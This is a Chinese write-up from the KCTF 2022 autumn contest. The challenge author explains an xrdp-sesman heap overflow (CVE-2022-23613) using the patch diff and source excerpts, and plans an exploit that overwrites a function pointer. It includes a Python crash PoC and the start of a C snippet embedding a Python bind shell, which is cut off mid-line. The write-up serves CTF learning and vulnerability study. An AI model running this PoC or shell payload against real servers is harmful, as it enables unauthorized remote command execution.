---
title: 看雪2022 KCTF 秋季赛 | 第七题设计思路及解析
url: https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458486282&idx=1&sn=71f316cf850ce64f8512e608974a881d&chksm=b18eb68086f93f96e68161fe2a34c5defd2955f7c90b02e6d366421893df62502f1c2974d57b&scene=58&subscene=0#rd
source: 看雪学院
date: 2022-12-03
fetch_date: 2025-10-04T00:24:29.397294
---

# 看雪2022 KCTF 秋季赛 | 第七题设计思路及解析

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8HDGvMlPib6bpzxpPaNb91zHtyRuC7EOAUEgWlxGZgF6IAIGB74UhSia25lNvDL72xe53XAdTLicYSIQ/0?wx_fmt=jpeg)

# 看雪2022 KCTF 秋季赛 | 第七题设计思路及解析

原创

2022 KCTF 秋季赛

看雪学苑

[*看雪 2022 KCTF秋季赛*](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458483668&idx=1&sn=df35db255afb9045521f889594e2acc5&chksm=b18e4b5e86f9c2484ce5f892774bd08973a0a1f7e297c1862742c85fc62cda5f1873afaba952&scene=21#wechat_redirect)已于11月15日中午12点正式开始！比赛延续上一届的模式并进行优化，对每道题设置了难度值、火力值、精致度等多类积分，用规则引导题目的难度和趣味度。大家请注意：签到题（https://ctf.pediy.com/game-season\_fight-216.htm）将持续开放，整个比赛期间均可提交答案，获得积分哦～

第七题《广厦万间》答题时间已截止，据统计：共3支战队成功提交flag，他们分别是：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HDGvMlPib6bpzxpPaNb91zHUzAssaHDNU7xicPPDcrWkEeTwL2lxR2aB0uDOTcT1icRySWtWKUowMrA/640?wx_fmt=png)

下面一起看看该赛题的设计思路和相关解析吧~

出题团队简介

第7题《广厦万间》出题方 **星盟安全团队****战队**

**战队成员id：Tokameine**

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HDGvMlPib6bpzxpPaNb91zH88JjSwHKXMiaEeDFbCSknpWOhDqMuViaCxYl3DIlzLNrzMIFhFSCvfyw/640?wx_fmt=png)

赛题设计思路

今年十月份，写了一篇关于该漏洞的利用分析：https://bbs.pediy.com/thread-274831.htm

我在文中对该漏洞的成因以及利用手段进行了较为详细的分析，最终得出的利用方式为：“通过建立大量连接进行堆喷，从而进行任意命令执行，从服务器中反弹一个shell出来进行连接。”

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HDGvMlPib6bpzxpPaNb91zHKUGOa6IOvggrKP6s1AuSliaalTeAxwfrpuIib7PgfkD9rSicCmjqopQKw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HDGvMlPib6bpzxpPaNb91zHaz4CXtJNicCm7cTS0WJIY3CIpzToWa9GibxXNGoO5ia12voSlBOSq9SMg/640?wx_fmt=png)

但是真的没有限制次数后也能稳定利用的方法吗？有，并且还不止一个，笔者在当时的文章写完后的第二天，躺在床上正好想起了这件事，并在接下来的一段时间里得到了在源程序不进行改变的情况下也能够稳定利用的方案。

两种方案都不需要更改源程序的允许连接数量 16 ，甚至不需要这么大，两种方案都只需要大约 5-10 个连接就能够稳定利用，这取决于 EXP 的精细程度。

第一种方案仍然依赖于堆喷，但是它并不需要很多的连接，笔者经过测试发现，只需要两个连接，就能够创建超过 0x100000~0xff00000 大小的堆空间。

第二种方案完全不依赖堆喷，它能够稳定控制调用 execlp3 或 execvp 的参数，而不需要经过任何地址碰撞。

> 其实，当时发那篇文章时，并没有将本利用作为赛题提交给KCTF的打算。
> 但是现在一想，如果我当时没有发布那篇文章，这道题的攻克者是否就会更少一点呢......略有些遗憾，但其实能有师傅做出来的话也还是很令笔者高兴的，尤其是能看到师傅们的利用思路，不论是否与我的预期相符。
>
> 秉承着 PWN FOR FUN 的原则，我仍然没有删除符号表，希望师傅们玩的开心。

#

##

```
一

回顾
```

首先回顾一下该漏洞的成因吧，该漏洞来自于 CVE-2022-23613 ，这是一个已公开的漏洞。

## **复现环境**

```
xrdp-sesman 0.9.18  The xrdp session manager  Copyright (C) 2004-2020 Jay Sorg, Neutrino Labs, and all contributors.  See https://github.com/neutrinolabs/xrdp for more information.
```

## 漏洞成因

```
static intsesman_data_in(struct trans *self){+ #define HEADER_SIZE 8    int version;    int size;
    if (self->extra_flags == 0)    {        in_uint32_be(self->in_s, version);        in_uint32_be(self->in_s, size);-        if (size > self->in_s->size)+        if (size < HEADER_SIZE || size > self->in_s->size)        {-            LOG(LOG_LEVEL_ERROR, "sesman_data_in: bad message size");+            LOG(LOG_LEVEL_ERROR, "sesman_data_in: bad message size %d", size);            return 1;        }        self->header_size = size;@@ -302,11 +303,12 @@ sesman_data_in(struct trans *self)            return 1;        }        /* reset for next message */-        self->header_size = 8;+        self->header_size = HEADER_SIZE;        self->extra_flags = 0;        init_stream(self->in_s, 0); /* Reset input stream pointers */    }    return 0;+ #undef HEADER_SIZE}
```

从已公开的 Patch 可以看出，它添加了一个对 size 变量的负数校验，似乎意味着整数溢出漏洞的存在，不妨跟踪一下该变量。

```
else /* connected server or client (2 or 3) */{    if (self->si != 0 && self->si->source[self->my_source] > MAX_SBYTES)    {    }    else if (self->trans_can_recv(self, self->sck, 0))    {        cur_source = XRDP_SOURCE_NONE;        if (self->si != 0)        {            cur_source = self->si->cur_source;            self->si->cur_source = self->my_source;        }        read_so_far = (int) (self->in_s->end - self->in_s->data);        to_read = self->header_size - read_so_far;
        if (to_read > 0)        {            read_bytes = self->trans_recv(self, self->in_s->end, to_read);
```

查找 self->header\_size 的引用，可以发现该变量将与 self->trans\_recv 的参数间接相关，而该函数类似于 read 的作用，将 self 相关的套接字中读取 to\_read 个字符到 self->in\_s->end 。

而该缓冲区来自于：

```
struct trans *trans_create(int mode, int in_size, int out_size){    struct trans *self = (struct trans *) NULL;
    self = (struct trans *) g_malloc(sizeof(struct trans), 1);
    if (self != NULL)    {        make_stream(self->in_s);        init_stream(self->in_s, in_size);        make_stream(self->out_s);        init_stream(self->out_s, out_size);        self->mode = mode;        self->tls = 0;        /* assign tcp calls by default */        self->trans_recv = trans_tcp_recv;        self->trans_send = trans_tcp_send;        self->trans_can_recv = trans_tcp_can_recv;    }
    return self;}
```

```
#define init_stream(s, v) do \    { \        if ((v) > (s)->size) \        { \            g_free((s)->data); \            (s)->data = (char*)g_malloc((v), 0); \            (s)->size = (v); \        } \        (s)->p = (s)->data; \        (s)->end = (s)->data; \        (s)->next_packet = 0; \    } while (0)
```

可以看见，该缓冲区会通过 g\_malloc 创建在堆上，那么只要 to\_read 的值超出了堆的原始大小，就有可能造成堆溢出了：

```
g_list_trans = trans_create(TRANS_MODE_TCP, 8192, 8192);
```

从调用点也可以看出，每次建立一个新的连接时都会为该连接创建一个大小为 0x2000 的输入缓冲区，并且接下来将会调用 trans\_check\_wait\_objs ：

```
inttrans_check_wait_objs(struct trans *self){    ......    if (self->type1 == TRANS_TYPE_LISTENER) /* listening */    {        ......    }    else /* connected server or client (2 or 3) */    {        if (self->si != 0 && self->si->source[self->my_source] > MAX_SBYTES)        {        }        else if (self->trans_can_recv(self, self->sck, 0))        {            cur_source = XRDP_SOURCE_NONE;            if (self->si != 0)            {                cur_source = self->si->cur_source;                self->si->cur_source = self->my_source;            }            read_so_far = (int) (self->in_s->end - self->in_s->data);            to_read = self->header_size - read_so_far;
            if (to_read > 0)            {                read_bytes = self->trans_recv(self, self->in_s->end, to_read);                ......            }        ......    }
    return rv;}
```

如果创建的类型不为 TRANS\_TYPE\_LISTENER ，那么该连接就会调用 self->trans\_recv 将数据直接读进刚刚创建的输入缓冲区中，且由于它并没有校验 self->header\_size 可能是负数的情况，因此可以令 to\_read 通过负数减去一个正数溢出为一个极大的正数，从而导致堆溢出。

POC：

```
import socketimport structif __name__ == "__main__":    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)    s.connect(("127.0.0.1",3350))    sdata = b''    sdata += struct.pack("I",0x2222CCCC) #version    sdata += struct.pack(">I",0x80000000) #headersize    s.send(sdata)    sdata = b'a'*0x10000  #padding    s.send(sdata)
```

## **漏洞利用**

回顾一下刚刚的 trans\_create 可以发现：

```
struct trans *trans_create(int mode, int in_size, int out_size){    struct trans *self = (struct trans *) NULL;
    self = (struct trans *) g_malloc(sizeof(struct trans), 1);    ......        self->trans_recv = trans_tcp_recv;        self->trans_send = trans_tcp_send;        self->trans_can_recv = trans_tcp_can_recv;    return self;}
```

struct trans self 结构体与输入输出缓冲区同样位于堆内存中，并且它还初始化了函数指针，那么一个可行的利用点就是：通过堆溢出去覆盖 self->trans\_recv 偏移处的值为一个类似 system 的函数来进行任意命令执行。

通过 IDA 搜索可以找到如下两个函数：

```
extern:00000000004105D8                 extrn g_execvp:nearextern:0000000000410658                 extrn g_execlp3:near
```

这两个命令分别是 execvp 和 execlp 的包装，函数实现如下：

```
intg_execvp(const char *p1, char *args[]){    ......    args_len = 0;    while (args[args_len] != NULL)    {        args_len++;    }    g_strnjoin(args_str, ARGS_STR_LEN, " ", (const char **) args, args_len);
    g_rm_temp_dir();    rv = execvp(p1, args);    ......}
intg_execlp3(const char *a1, const char *a2, const char *a3){    ......    g_strnjoin(args_str, ARGS_STR_LEN, " ", args, 2);    ......    g_rm_temp_dir();    rv = execlp(a1, a2, a3, (void *)0);    ......}
```

因为 xrdp 服务是通过 socket 进行通信的，因此让其打开 “/bin/sh” 是不够的，想要让它能够完成任意命令执行，最好还是让它反弹一个 shell 出来比较合适，比方说：

```
#include<stdlib.h>int main(){    char ars2[]="-cimport socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((\"\",10000));s.listen();c,_=s.accept();f=c.fileno();os.dup2(f,0);os.dup2(f,1);os.dup2(f,2);os.system(\"sh\");";    execlp("...